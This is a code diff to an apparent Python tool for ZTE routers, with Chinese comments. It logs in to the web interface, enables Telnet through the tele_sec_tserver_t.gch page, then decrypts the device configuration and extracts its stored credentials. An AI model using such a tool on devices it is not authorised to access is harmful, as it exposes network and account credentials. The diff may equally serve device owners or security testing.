@@ -96,9 +96,17 @@ def cmd_zte(a):
             if a.mode == "factory":
                 return 3
 
+    web_cred = None
     if a.mode in ("web", "both"):
         w = zte_web.ZteWeb(a.host, a.port, a.user, a.password)
         if w.login():
+            # 工厂模式已经拿到 Telnet 账号时，不再改 Web 上的开关。
+            aes_page = zte_web.uses_aes_login(w.login_html or "")
+            if not telnet_user and (a.enable_telnet or (a.extract and aes_page)):
+                try:
+                    web_cred = w.enable_telnet()
+                except Exception as e:
+                    log("WARN", "Web 开启 Telnet 失败：%s" % e)
             pages = w.pages()
             log("DATA", "枚举页面 %d 个" % len(pages))
             for p in pages[: a.limit or len(pages)]:
@@ -114,15 +122,20 @@ def cmd_zte(a):
         except Exception as e:
             log("WARN", "永久 Telnet 失败：%s" % e)
 
+    if not telnet_user and web_cred:
+        telnet_user, telnet_pw = web_cred
+
     if telnet_user and a.extract:
         t = Telnet(a.host, a.telnet_port)
-        if t.login(telnet_user, [telnet_pw]):
-            log("AUTH", "Telnet 登录成功")
-            if zte_web.decrypt_config(t):
-                zte_web.extract_credentials(t)
+        try:
+            if t.login(telnet_user, [telnet_pw]):
+                log("AUTH", "Telnet 登录成功")
+                if zte_web.decrypt_config(t):
+                    zte_web.extract_credentials(t)
+            else:
+                log("WARN", "Telnet 登录失败")
+        finally:
             t.close()
-        else:
-            log("WARN", "Telnet 登录失败")
     return 0
 
 
@@ -226,7 +239,8 @@ def main(argv=None):
     z.add_argument("--mode", choices=["factory", "web", "both"], default="both")
     z.add_argument("--limit", type=int, default=0)
     z.add_argument("--telnet-port", type=int, default=23)
-    z.add_argument("--enable-telnet", action="store_true", help="写入 TelnetCfg 使 Telnet 自启")
+    z.add_argument("--enable-telnet", action="store_true",
+                   help="开启 Telnet：工厂模式写 TelnetCfg；Web 模式提交 tele_sec_tserver_t.gch（仅 LAN）")
     z.add_argument("--extract", action="store_true", help="解密配置并提取凭据")
     z.set_defaults(func=cmd_zte)
 
